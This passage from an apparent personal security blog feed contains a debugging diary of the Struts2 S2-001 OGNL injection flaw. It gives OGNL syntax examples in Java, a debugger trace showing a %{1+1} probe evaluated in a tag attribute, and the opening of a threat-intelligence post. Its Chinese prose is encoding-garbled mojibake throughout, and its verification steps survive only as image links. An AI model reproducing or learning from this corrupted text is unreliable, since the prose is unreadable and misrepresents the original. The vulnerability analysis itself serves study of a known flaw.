æ­¤ï¼Œè¡¨è¾¾å¼å…¶å®æ˜¯ä¸€ä¸ªå¸¦æœ‰è¯­æ³•å«ä¹‰çš„å­—ç¬¦ä¸²ï¼Œæ•´ä¸ªå­—ç¬¦ä¸²å°†è§„å®šæ“ä½œçš„ç±»å‹å’Œå†…å®¹ã€‚OGNLè¡¨è¾¾å¼æ”¯æŒå¤§é‡çš„è¡¨è¾¾å¼ï¼Œå¦‚â€œé“¾å¼è®¿é—®å¯¹è±¡â€ã€è¡¨è¾¾å¼è®¡ç®—ã€ç”šè‡³è¿˜æ”¯æŒLambdaè¡¨è¾¾å¼ã€‚</p><p>ã€€ã€€äºŒã€Rootå¯¹è±¡ï¼š</p><p>ã€€ã€€ã€€ã€€OGNLçš„Rootå¯¹è±¡å¯ä»¥ç†è§£ä¸ºOGNLçš„æ“ä½œå¯¹è±¡ã€‚å½“æˆ‘ä»¬æŒ‡å®šäº†ä¸€ä¸ªè¡¨è¾¾å¼çš„æ—¶å€™ï¼Œæˆ‘ä»¬éœ€è¦æŒ‡å®šè¿™ä¸ªè¡¨è¾¾å¼é’ˆå¯¹çš„æ˜¯å“ªä¸ªå…·ä½“çš„å¯¹è±¡ã€‚è€Œè¿™ä¸ªå…·ä½“çš„å¯¹è±¡å°±æ˜¯Rootå¯¹è±¡ï¼Œè¿™å°±æ„å‘³ç€ï¼Œå¦‚æœæœ‰ä¸€ä¸ªOGNLè¡¨è¾¾å¼ï¼Œé‚£ä¹ˆæˆ‘ä»¬éœ€è¦é’ˆå¯¹Rootå¯¹è±¡æ¥è¿›è¡ŒOGNLè¡¨è¾¾å¼çš„è®¡ç®—å¹¶ä¸”è¿”å›ç»“æœã€‚</p><p>ã€€ã€€ä¸‰ã€ä¸Šä¸‹æ–‡ç¯å¢ƒï¼š</p><p>ã€€ã€€ã€€ã€€æœ‰ä¸ªRootå¯¹è±¡å’Œè¡¨è¾¾å¼ï¼Œæˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨OGNLè¿›è¡Œç®€å•çš„æ“ä½œäº†ï¼Œå¦‚å¯¹Rootå¯¹è±¡çš„èµ‹å€¼ä¸å–å€¼æ“ä½œã€‚ä½†æ˜¯ï¼Œå®é™…ä¸Šåœ¨OGNLçš„å†…éƒ¨ï¼Œæ‰€æœ‰çš„æ“ä½œéƒ½ä¼šåœ¨ä¸€ä¸ªç‰¹å®šçš„æ•°æ®ç¯å¢ƒä¸­è¿è¡Œã€‚è¿™ä¸ªæ•°æ®ç¯å¢ƒå°±æ˜¯ä¸Šä¸‹æ–‡ç¯å¢ƒï¼ˆContextï¼‰ã€‚OGNLçš„ä¸Šä¸‹æ–‡ç¯å¢ƒæ˜¯ä¸€ä¸ªMapç»“æ„ï¼Œç§°ä¹‹ä¸ºOgnlContextã€‚Rootå¯¹è±¡ä¹Ÿä¼šè¢«æ·»åŠ åˆ°ä¸Šä¸‹æ–‡ç¯å¢ƒå½“ä¸­å»ã€‚</p><h3 id="Ognlè¡¨è¾¾å¼è¯­è¨€çš„ä½œç”¨"><a href="#Ognlè¡¨è¾¾å¼è¯­è¨€çš„ä½œç”¨" class="headerlink" title="Ognlè¡¨è¾¾å¼è¯­è¨€çš„ä½œç”¨"></a>Ognlè¡¨è¾¾å¼è¯­è¨€çš„ä½œç”¨</h3><p>jspé¡µé¢å–å€¼ç”¨<br>ELè¡¨è¾¾å¼è¯­è¨€ï¼Œä¹Ÿç”¨äºé¡µé¢å–å€¼ï¼Œæ˜¯jspé¡µé¢å–å€¼çš„æ ‡å‡†ï¼ˆé»˜è®¤å°±å¯ä»¥ä½¿ç”¨ï¼‰<br>Ognlè¡¨è¾¾å¼è¯­è¨€ï¼ŒStrutsæ ‡ç­¾é»˜è®¤æ”¯æŒçš„è¡¨è¾¾å¼è¯­è¨€ï¼Œå¿…é¡»é…ç½®Strutsæ ‡ç­¾ç”¨ï¼Œä¸èƒ½ç¦»å¼€Strutsæ ‡ç­¾ç›´æ¥ä½¿ç”¨ï¼Œå°±æ˜¯è¯´Ognlå¿…é¡»åœ¨Strutsä¸­ä½¿ç”¨<br>å¯¹æ¯”æ¥çœ‹ï¼ŒELä½¿ç”¨èŒƒå›´æ›´å¹¿ï¼Œé¡¹ç›®ä¸­ä¸é™åˆ¶ä½¿ç”¨å“ªä¸€ç§ï¼Œå“ªä¸€ç§ç†Ÿæ‚‰å°±ä½¿ç”¨å“ªä¸€ç§</p><h3 id="OGNL-çš„åŸºæœ¬è¯­æ³•"><a href="#OGNL-çš„åŸºæœ¬è¯­æ³•" class="headerlink" title="OGNL çš„åŸºæœ¬è¯­æ³•"></a>OGNL çš„åŸºæœ¬è¯­æ³•</h3><ol><li><p>å¯¹Rootå¯¹è±¡çš„è®¿é—®<br>OGNLä½¿ç”¨çš„æ˜¯ä¸€ç§é“¾å¼çš„é£æ ¼è¿›è¡Œå¯¹è±¡çš„è®¿é—®</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User user = <span class="keyword">new</span> User(<span class="string">"rcx"</span>, <span class="string">"123"</span>);</span><br><span class="line">System.out.println(Ognl.getValue(<span class="string">"name"</span>, user));</span><br></pre></td></tr></table></figure></li><li><p>å¯¹ä¸Šä¸‹æ–‡å¯¹è±¡çš„è®¿é—®<br>ä½¿ç”¨OGNLçš„æ—¶å€™å¦‚æœä¸è®¾ç½®ä¸Šä¸‹æ–‡å¯¹è±¡ï¼Œç³»ç»Ÿä¼šè‡ªåŠ¨åˆ›å»ºä¸€ä¸ªä¸Šä¸‹æ–‡å¯¹è±¡ï¼Œå¦‚æœä¼ å…¥çš„å‚æ•°å½“ä¸­åŒ…å«äº†ä¸Šä¸‹æ–‡å¯¹è±¡åˆ™ä¼šä½¿ç”¨ä¼ å…¥çš„ä¸Šä¸‹æ–‡å¯¹è±¡ã€‚å½“è®¿é—®ä¸Šä¸‹æ–‡ç¯å¢ƒå½“ä¸­çš„å‚æ•°æ—¶å€™ï¼Œéœ€è¦åœ¨è¡¨è¾¾å¼å‰é¢åŠ ä¸Šâ€™#â€™ï¼Œè¡¨ç¤ºäº†ä¸è®¿é—®Rootå¯¹è±¡çš„åŒºåˆ«</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">User user = <span class="keyword">new</span> User(<span class="string">"rcx"</span>, <span class="string">"123"</span>);</span><br><span class="line">Map&lt;String, Object&gt; context = <span class="keyword">new</span> HashMap&lt;String, Object&gt;();</span><br><span class="line">context.put(<span class="string">"user"</span>, user);</span><br><span class="line">System.out.println(Ognl.getValue(<span class="string">"#user.name"</span>, context, user));</span><br></pre></td></tr></table></figure></li><li><p>å¯¹é™æ€å˜é‡çš„è®¿é—®<br>åœ¨OGNLè¡¨è¾¾å¼å½“ä¸­ä¹Ÿå¯ä»¥è®¿é—®é™æ€å˜é‡æˆ–è€…è°ƒç”¨é™æ€æ–¹æ³•ï¼Œæ ¼å¼å¦‚@[class]@[field/method()]ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Object object = Ognl.getValue(<span class="string">"@com.rcx.ognl.Constant@ONE"</span>, <span class="keyword">null</span>);</span><br><span class="line">System.out.println(object);</span><br></pre></td></tr></table></figure></li><li><p>æ–¹æ³•çš„è°ƒç”¨<br>å¦‚æœéœ€è¦è°ƒç”¨Rootå¯¹è±¡æˆ–è€…ä¸Šä¸‹æ–‡å¯¹è±¡å½“ä¸­çš„æ–¹æ³•ä¹Ÿå¯ä»¥ä½¿ç”¨.+æ–¹æ³•çš„æ–¹å¼æ¥è°ƒç”¨ã€‚ç”šè‡³å¯ä»¥ä¼ å…¥å‚æ•°ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">User user = <span class="keyword">new</span> User();</span><br><span class="line">Map&lt;String, Object&gt; context = <span class="keyword">new</span> HashMap&lt;String, Object&gt;();</span><br><span class="line">context.put(<span class="string">"name"</span>, <span class="string">"rcx"</span>);</span><br><span class="line">context.put(<span class="string">"password"</span>, <span class="string">"password"</span>);</span><br><span class="line"></span><br><span class="line">System.out.println(Ognl.getValue(<span class="string">"getName()"</span>, context, user));</span><br><span class="line">Ognl.getValue(<span class="string">"setName(#name)"</span>, context, user);</span><br><span class="line">System.out.println(Ognl.getValue(<span class="string">"getName()"</span>, context, user));</span><br></pre></td></tr></table></figure></li><li><p>å¯¹æ•°ç»„å’Œé›†åˆçš„è®¿é—®<br>OGNLæ”¯æŒå¯¹æ•°ç»„æŒ‰ç…§æ•°ç»„ä¸‹æ ‡çš„é¡ºåºè¿›è¡Œè®¿é—®ã€‚æ­¤æ–¹å¼ä¹Ÿé€‚ç”¨äºå¯¹é›†åˆçš„è®¿é—®ï¼Œå¯¹äºMapæ”¯æŒä½¿ç”¨é”®è¿›è¡Œè®¿é—®</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">User user = <span class="keyword">new</span> User();</span><br><span class="line">Map&lt;String, Object&gt; context = <span class="keyword">new</span> HashMap&lt;String, Object&gt;();</span><br><span class="line">String[] strings  = &#123;<span class="string">"aa"</span>, <span class="string">"bb"</span>&#125;;</span><br><span class="line">ArrayList&lt;String&gt; list = <span class="keyword">new</span> ArrayList&lt;String&gt;();</span><br><span class="line">list.add(<span class="string">"aa"</span>);</span><br><span class="line">list.add(<span class="string">"bb"</span>);</span><br><span class="line">Map&lt;String, String&gt; map = <span class="keyword">new</span> HashMap&lt;String, String&gt;();</span><br><span class="line">map.put(<span class="string">"key1"</span>, <span class="string">"value1"</span>);</span><br><span class="line">map.put(<span class="string">"key2"</span>, <span class="string">"value2"</span>);</span><br><span class="line">context.put(<span class="string">"list"</span>, list);</span><br><span class="line">context.put(<span class="string">"strings"</span>, strings);</span><br><span class="line">context.put(<span class="string">"map"</span>, map);</span><br><span class="line"><span class="keyword">try</span></span><br><span class="line">&#123;</span><br><span class="line">    System.out.println(Ognl.getValue(<span class="string">"#strings[0]"</span>, context, user));</span><br><span class="line">    System.out.println(Ognl.getValue(<span class="string">"#list[0]"</span>, context, user));</span><br><span class="line">    System.out.println(Ognl.getValue(<span class="string">"#list[0 + 1]"</span>, context, user));</span><br><span class="line">    System.out.println(Ognl.getValue(<span class="string">"#map['key1']"</span>, context, user));</span><br><span class="line">    System.out.println(Ognl.getValue(<span class="string">"#map['key' + '2']"</span>, context, user));</span><br><span class="line">    &#125; ...</span><br></pre></td></tr></table></figure></li><li><p>æŠ•å½±ä¸é€‰æ‹©<br>OGNLæ”¯æŒç±»ä¼¼æ•°æ®åº“å½“ä¸­çš„é€‰æ‹©ä¸æŠ•å½±åŠŸèƒ½ã€‚<br>æŠ•å½±ï¼šé€‰å‡ºé›†åˆå½“ä¸­çš„ç›¸åŒå±æ€§ç»„åˆæˆä¸€ä¸ªæ–°çš„é›†åˆã€‚è¯­æ³•ä¸ºcollection.{XXX}ï¼ŒXXXå°±æ˜¯é›†åˆä¸­æ¯ä¸ªå…ƒç´ çš„å…¬å…±å±æ€§ã€‚</p></li></ol><p>ã€€ã€€é€‰æ‹©ï¼šé€‰æ‹©å°±æ˜¯é€‰æ‹©å‡ºé›†åˆå½“ä¸­ç¬¦åˆæ¡ä»¶çš„å…ƒç´ ç»„åˆæˆæ–°çš„é›†åˆã€‚è¯­æ³•ä¸ºcollection.{Y XXX}ï¼Œå…¶ä¸­Yæ˜¯ä¸€ä¸ªé€‰æ‹©æ“ä½œç¬¦ï¼ŒXXXæ˜¯é€‰æ‹©ç”¨çš„é€»è¾‘è¡¨è¾¾å¼ã€‚</p><p>ã€€ã€€ã€€ã€€é€‰æ‹©æ“ä½œç¬¦æœ‰3ç§ï¼š</p><p>ã€€ã€€ã€€ã€€ã€€ã€€? ï¼šé€‰æ‹©æ»¡è¶³æ¡ä»¶çš„æ‰€æœ‰å…ƒç´ </p><p>ã€€ã€€ã€€ã€€ã€€ã€€^ï¼šé€‰æ‹©æ»¡è¶³æ¡ä»¶çš„ç¬¬ä¸€ä¸ªå…ƒç´ </p><p>ã€€ã€€ã€€ã€€ã€€ã€€$ï¼šé€‰æ‹©æ»¡è¶³æ¡ä»¶çš„æœ€åä¸€ä¸ªå…ƒç´ </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Person p1 = <span class="keyword">new</span> Person(<span class="number">1</span>, <span class="string">"name1"</span>);</span><br><span class="line">Map&lt;String, Object&gt; context = <span class="keyword">new</span> HashMap&lt;String, Object&gt;();</span><br><span class="line">ArrayList&lt;Person&gt; list = <span class="keyword">new</span> ArrayList&lt;Person&gt;();</span><br><span class="line">list.add(p1);</span><br><span class="line">context.put(<span class="string">"list"</span>, list);</span><br><span class="line"></span><br><span class="line">ArrayList&lt;Integer&gt; list2 = (ArrayList&lt;Integer&gt;) Ognl.getValue(<span class="string">"#list.&#123;id&#125;"</span>,context,list);</span><br><span class="line">System.out.println(list2);</span><br></pre></td></tr></table></figure><ol start="7"><li>åˆ›å»ºå¯¹è±¡<br>OGNLæ”¯æŒç›´æ¥ä½¿ç”¨è¡¨è¾¾å¼æ¥åˆ›å»ºå¯¹è±¡ã€‚ä¸»è¦æœ‰ä¸‰ç§æƒ…å†µï¼š<br>æ„é€ Listå¯¹è±¡ï¼šä½¿ç”¨{},ä¸­é—´ä½¿ç”¨â€™,â€™è¿›è¡Œåˆ†å‰²å¦‚{â€œaaâ€, â€œbbâ€, â€œccâ€}<br>æ„é€ Mapå¯¹è±¡ï¼šä½¿ç”¨#{}ï¼Œä¸­é—´ä½¿ç”¨â€™,è¿›è¡Œåˆ†å‰²é”®å€¼å¯¹ï¼Œé”®å€¼å¯¹ä½¿ç”¨â€™:â€™åŒºåˆ†ï¼Œå¦‚#{â€œkey1â€ : â€œvalue1â€, â€œkey2â€ : â€œvalue2â€}<br>æ„é€ ä»»æ„å¯¹è±¡ï¼šç›´æ¥ä½¿ç”¨å·²çŸ¥çš„å¯¹è±¡çš„æ„é€ æ–¹æ³•è¿›è¡Œæ„é€ ã€‚</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Map&lt;String, String&gt; map = (Map&lt;String, String&gt;)Ognl.getValue(<span class="string">"#&#123;'key1':'value1'&#125;"</span>, <span class="keyword">null</span>);</span><br><span class="line">System.out.println(map);</span><br><span class="line">List&lt;String&gt; list = (List&lt;String&gt;)Ognl.getValue(<span class="string">"&#123;'key1','value1'&#125;"</span>, <span class="keyword">null</span>);</span><br><span class="line">System.out.println(list);</span><br><span class="line">Object object = Ognl.getValue(<span class="string">"new java.lang.Object()"</span>, <span class="keyword">null</span>);</span><br><span class="line">System.out.println(object);</span><br></pre></td></tr></table></figure><h2 id="0x04-æ¼æ´éªŒè¯"><a href="#0x04-æ¼æ´éªŒè¯" class="headerlink" title="0x04 æ¼æ´éªŒè¯"></a>0x04 æ¼æ´éªŒè¯</h2><p><img src="/S2-001 è°ƒè¯•æ—¥è®°.resources/AE253F90-888E-41D1-90B8-15C4B43015B0.png" alt="173a3723c16631be26264844cdbf62f1"></p><p><img src="/S2-001 è°ƒè¯•æ—¥è®°.resources/5EEDC8F3-78F4-480C-8DEF-66D5F3A94521.png" alt="d984073fd34482b1ab9fdcbde28db701"></p><h2 id="0x05-æ¼æ´åˆ†æ"><a href="#0x05-æ¼æ´åˆ†æ" class="headerlink" title="0x05 æ¼æ´åˆ†æ"></a>0x05 æ¼æ´åˆ†æ</h2><p><img src="/S2-001 è°ƒè¯•æ—¥è®°.resources/6C8B9E07-AF85-49FC-B9C5-C1D818490AB0.jpg" alt="7b8b8f885d3938a55ac1f182230f389b.jpeg"></p><p>Tomcatå®¹å™¨å¤„ç†åï¼Œå°†httpè¯·æ±‚å‘é€è‡³struts2ï¼Œç„¶ååˆ†ä¸¤ä¸ªé˜¶æ®µï¼š</p><ul><li>ç¬¬ä¸€é˜¶æ®µï¼š St2å¯¹è¯·æ±‚è¿›è¡Œé¢„å¤„ç†,è¿™ä¸ªé˜¶æ®µä¸»è¦æ˜¯St2å’Œwebå®¹å™¨æ‰“äº¤é“,æŠŠhttpè¯·æ±‚å°è£…æˆjavaå¯¹è±¡.ä¸ºçœŸæ­£çš„ä¸šåŠ¡é€»è¾‘æ‰§è¡Œåšå¿…è¦çš„æ•°æ®ç¯å¢ƒå’Œè¿è¡Œç¯å¢ƒçš„å‡†å¤‡</li><li>ç¬¬äºŒé˜¶æ®µï¼šXWork,æ‰§è¡Œå…·ä½“çš„ä¸šåŠ¡é€»è¾‘.</li></ul><p>é¦–å…ˆæ¥äº†è§£ä¸€ä¸‹æ‹¦æˆªå™¨</p><blockquote><p>javaé‡Œçš„æ‹¦æˆªå™¨æ˜¯åŠ¨æ€æ‹¦æˆªActionè°ƒç”¨çš„å¯¹è±¡ï¼Œå®ƒæä¾›äº†ä¸€ç§æœºåˆ¶å¯ä»¥ä½¿å¼€å‘è€…åœ¨ä¸€ä¸ªActionæ‰§è¡Œçš„å‰åæ‰§è¡Œä¸€æ®µä»£ç ï¼Œä¹Ÿå¯ä»¥åœ¨ä¸€ä¸ªActionæ‰§è¡Œå‰é˜»æ­¢å…¶æ‰§è¡Œï¼ŒåŒæ—¶ä¹Ÿæä¾›äº†ä¸€ç§å¯ä»¥æå–Actionä¸­å¯é‡ç”¨éƒ¨åˆ†ä»£ç çš„æ–¹å¼ã€‚åœ¨AOPä¸­ï¼Œæ‹¦æˆªå™¨ç”¨äºåœ¨æŸä¸ªæ–¹æ³•æˆ–è€…å­—æ®µè¢«è®¿é—®ä¹‹å‰ï¼Œè¿›è¡Œæ‹¦æˆªç„¶åå†ä¹‹å‰æˆ–è€…ä¹‹ååŠ å…¥æŸäº›æ“ä½œã€‚ç›®å‰ï¼Œæˆ‘ä»¬éœ€è¦æŒæ¡çš„ä¸»è¦æ˜¯Springçš„æ‹¦æˆªå™¨ï¼ŒStruts2çš„æ‹¦æˆªå™¨ä¸ç”¨æ·±ç©¶ï¼ŒçŸ¥é“å³å¯ã€‚</p></blockquote><p><img src="/S2-001 è°ƒè¯•æ—¥è®°.resources/87075291-4555-41BC-88CF-2F4F726BA71E.png" alt="48f11e0431d2c25296631c524ecb17dc"><br>åœ¨struts.xmlé‡Œä¸‹ä¸€ä¸ªæ‹¦æˆªå™¨ï¼Œç„¶ååœ¨struts_defalut.xmlé‡Œèƒ½æ‰¾åˆ°å®ƒæ‹¦æˆªçš„class<br><img src="/S2-001 è°ƒè¯•æ—¥è®°.resources/8AD9EB5A-5743-4E42-84F8-724D6D50F987.png" alt="6244e2c9092e27087d80960fd067f86c"></p><p><img src="/S2-001 è°ƒè¯•æ—¥è®°.resources/1B116D26-D461-4173-B2AA-A4639BF3C65A.png" alt="11ae2cbbc91813e4be305fcd62fcd2f7"><br>ç¬¬87è¡Œã€æŠŠä¼ å…¥çš„å‚æ•°æ‰“å…¥åˆ°å€¼æ ˆä¸­,æˆ‘ä»¬åœ¨è¿™é‡Œä¸‹æ–­ç‚¹<br><img src="/S2-001 è°ƒè¯•æ—¥è®°.resources/0B9C052A-FBA3-402E-B441-377BC06BEC9E.png" alt="210a7716d4e72acc34ea0c9e4debb639"><br>ç»§ç»­å¾€ä¸‹ï¼Œ97è¡Œï¼Œå¸¦å…¥åˆ°invocation.invoke()</p><p><img src="/S2-001 è°ƒè¯•æ—¥è®°.resources/0F272921-D58B-457B-B0FE-03FE1E447BF7.png" alt="c95f5460a33e0a3cce226cb863a704fe"><br>ç»§ç»­è·Ÿ<br><img src="/S2-001 è°ƒè¯•æ—¥è®°.resources/C12A6394-C3E3-4591-8B72-DFEC418B2836.png" alt="40d89332841b0919edbc30728ba0dff4"><br>æ­¥å…¥<code>executeResult()</code></p><p>ç„¶åæ­¥å…¥<code>dispatcher.forward()</code></p><p><img src="/S2-001 è°ƒè¯•æ—¥è®°.resources/D0D7AEDE-9400-4D4F-B636-DCF8B2E2FE9D.png" alt="4d1c0453520932caa0527b00105e2931"><br>è°ƒè¯•åˆ°è¿™é‡Œåˆåˆ°äº†index.jsp<br>ç„¶åå°±æ˜¯åœ¨<code>org.apache.struts2.views.jsp.ComponentTagSupport</code>è§£ææ ‡ç­¾<br><img src="/S2-001 è°ƒè¯•æ—¥è®°.resources/489250AB-D028-46B8-93EE-E7652452F06B.png" alt="83ab3028a4d3ce9e570b2dd77b6c06d4"><br>ç„¶åæ­¥å…¥<code>evaluateParams()</code><br><img src="/S2-001 è°ƒè¯•æ—¥è®°.resources/B66173B9-1004-4877-B90C-52ED6488D814.png" alt="148f0c15f9f6c13af04ed5bcf3357e66"><br>ç»§ç»­æ‰§è¡Œåˆ°altSyntax(),è¿™ä¸ªæ–¹æ³•è¿”å›true,æ ¹æ®<a href="https://cwiki.apache.org/confluence/display/WW/Alt+Syntax" target="_blank" rel="noopener">https://cwiki.apache.org/confluence/display/WW/Alt+Syntax</a><br>,altSyntaxé»˜è®¤å¼€å¯,ä¸ºäº†åŠ¨æ€çš„æ”¹å˜æ ‡ç­¾å±æ€§çš„å€¼,å®ƒå…è®¸æ‰§è¡Œæ ‡ç­¾å±æ€§ä¸­çš„OGNLè¡¨è¾¾å¼.</p><p>åŒæ—¶,ä¸ºäº†ä¸è¿‡å¤šçš„å¼•å…¥å•å¼•å·,å¯ä»¥ä½¿ç”¨â€%{â€¦}â€çš„å½¢å¼æ¥å†™å…¥è¡¨è¾¾å¼.</p><p>æ­¤åoä¸º%{1+1}ï¼Œå†å¯¹oè¿›è¡Œäº†ä¸€ç•ªå¤„ç†åï¼Œpayloadç»è¿‡resultå˜é‡ï¼Œæœ€ç»ˆæˆä¸ºexpressionçš„å€¼ï¼š<br><img src="/S2-001 è°ƒè¯•æ—¥è®°.resources/38069271-2D08-4E46-AF70-5D74F1CA6BF2.png" alt="f079a36c37e194f8835ce649747acfae"></p><p><img src="/S2-001 è°ƒè¯•æ—¥è®°.resources/1EF4E0C0-D0AD-47E9-B2D6-28F1583690EB.png" alt="2e1134a2480a0576252c8bffc59beea3"><br><img src="/S2-001 è°ƒè¯•æ—¥è®°.resources/96B54A5E-7312-40B9-A2D6-0DEF9D868B6E.png" alt="29bb80f0510fa9b3c240536a175a3c7b"><br>æœ€å<code>Object o = stack.findValue(var, asType);</code>æ‰§è¡Œpayload<br><img src="/S2-001 è°ƒè¯•æ—¥è®°.resources/F61303FA-6893-40A5-A62B-492EC506AE7C.png" alt="69e61401ac66f42f5b7f17f42870d541"></p><h2 id="0x06-æ€»ç»“"><a href="#0x06-æ€»ç»“" class="headerlink" title="0x06 æ€»ç»“"></a>0x06 æ€»ç»“</h2><p>å…¶å®è¿™ä¸ªæ¼æ´è¿˜æ˜¯æŒºç®€å•çš„ï¼Œå†™çš„å¾ˆä¹±ï¼Œä½†æ˜¯ç¡®å®æ˜¯è·Ÿç€å‡ ç¯‡æ–‡ç« ä¸€æ­¥ä¸€æ­¥è‡ªå·±è·³å‡ºæ¥çš„ï¼Œä¹Ÿç®—æ˜¯ç¬¬ä¸€ä¸ªè°ƒçš„javaæ¼æ´äº†ï¼Œå­¦åˆ°å¾ˆå¤šè°ƒè¯•æŠ€å·§ï¼Œè†œä¸€ä¸‹chybetaå¸ˆå‚…..</p><h2 id="0x07-é“¾æ¥"><a href="#0x07-é“¾æ¥" class="headerlink" title="0x07 é“¾æ¥"></a>0x07 é“¾æ¥</h2><p><a href="https://03i0.com/2018/04/08/S2-001%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">https://03i0.com/2018/04/08/S2-001%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90/</a></p><p><a href="https://www.kingkk.com/2018/08/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E5%AD%A6%E4%B9%A0struts2-S2-001/#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8" target="_blank" rel="noopener">https://www.kingkk.com/2018/08/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E5%AD%A6%E4%B9%A0struts2-S2-001/#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8</a></p><p><a href="https://xz.aliyun.com/t/2044" target="_blank" rel="noopener">https://xz.aliyun.com/t/2044</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;@ Author: Patrilic&lt;br&gt;@ Time: 2019-8-15 02:11:50&lt;br&gt;&lt;img src=&quot;/wallpaper/[33861]âŠ-52241977.png&quot; alt&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 i
      
    
    </summary>
    
      <category term="æ¼æ´å¤ç°" scheme="http://patrilic.top/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
      <category term="Struts2" scheme="http://patrilic.top/tags/Struts2/"/>
    
  </entry>
  
  <entry>
    <title>åˆè¯†å¨èƒæƒ…æŠ¥</title>
    <link href="http://patrilic.top/2019/08/14/%E5%88%9D%E8%AF%86%E5%A8%81%E8%83%81%E6%83%85%E6%8A%A5/"/>
    <id>http://patrilic.top/2019/08/14/åˆè¯†å¨èƒæƒ…æŠ¥/</id>
    <published>2019-08-14T15:32:22.000Z</published>
    <updated>2019-08-20T15:30:37.034Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>@Author: Patrilic<br>@Time: 2019-08-14 23:32:22<br><img src="/wallpaper/[30679]SCENT-65089776.png" alt></p></blockquote><h2 id="0x00-å‰è¨€"><a href="#0x00-å‰è¨€" class="headerlink" title="0x00 å‰è¨€"></a>0x00 å‰è¨€</h2><p>è‡ªä»æŠŠå­¦ä¹ é‡å¿ƒåå‘RedTeamç›¸å…³ä¹‹åï¼Œä¸€ç›´æƒ³å­¦ä¹ å…³äºå¨èƒæƒ…æŠ¥çš„ä¸œè¥¿ï¼Œå¹³æ—¶ä¹Ÿä¼šåœ¨<a href="https://x.threatbook.cn/" target="_blank" rel="noopener">å¾®æ­¥ç¤¾åŒº</a>ä¹‹ç±»çš„åœ°æ–¹å»çœ‹ä¸€äº›å…³äºå¨èƒçš„åˆ†ææŠ¥å‘Šã€‚ä»Šå¤©æ™šä¸Šç»ˆäºç©ºäº†ä¸‹æ¥ï¼Œå‡†å¤‡å¥½å¥½çš„æ²‰æ·€ä¸€ä¸‹ï¼Œæœ€è¿‘å‘ç”Ÿå¾ˆå¤šäº‹æƒ…ï¼Œå¹¶ä¸”æ¥äº†ä¸ªé¡¹ç›®ï¼Œä¸€ç›´åœ¨å¿™ï¼Œè¿™å‡ å¤©å°±å¥½å¥½çš„æ²‰é™ä¸‹æ¥å»ç³»ç»Ÿè®¤è¯†ä¸€ä¸‹è¿™ä¸ªä¸œè¥¿</p><h2 id="0x01-ç›¸å…³æ¦‚å¿µ"><a href="#0x01-ç›¸å…³æ¦‚å¿µ" class="headerlink" title="0x01 ç›¸å…³æ¦‚å¿µ"></a>0x01 ç›¸å…³æ¦‚å¿µ</h2><h3 id="å®šä¹‰"><a href="#å®šä¹‰" class="headerlink" title="å®šä¹‰"></a>å®šä¹‰</h3><p>ç¿»äº†å¾ˆå¤šæ–‡ç« ï¼Œå¤§å¤šæ•°éƒ½æ˜¯è®¤ä¸ºå¨èƒæƒ…æŠ¥çš„å®šä¹‰ä¸ºGartneråœ¨2014å¹´å‘è¡¨çš„ã€Šå®‰å…¨å¨èƒæƒ…æŠ¥æœåŠ¡å¸‚åœºæŒ‡å—ã€‹</p><blockquote><p>åŸºäºä¸€å®šçŸ¥è¯†çš„è¯æ®ï¼Œå·²ç»å­˜åœ¨æˆ–æ­£åœ¨å½¢æˆçš„æ½œåœ¨å¨èƒï¼Œæ¯”å¦‚ï¼Œä¸Šä¸‹æ–‡ã€æœºåˆ¶ã€æŒ‡æ ‡ã€æ„ä¹‰ä»¥åŠå¯å®æ–½çš„å»ºè®®ï¼Œåˆ©ç”¨è¿™äº›ï¼Œå¯ä»¥å¸®åŠ©å½“äº‹äººå½¢æˆåº”å¯¹è¿™äº›å±é™©çš„å†³ç­–ã€‚</p></blockquote><h3 id="the-pyramid-of-pain"><a href="#the-pyramid-of-pain" class="headerlink" title="the-pyramid-of-pain"></a>the-pyramid-of-pain</h3><p><img src="/åˆè¯†å¨èƒæƒ…æŠ¥.resources/7EC24897-0F01-4B0B-A3D3-63D3E1AF2863.png" 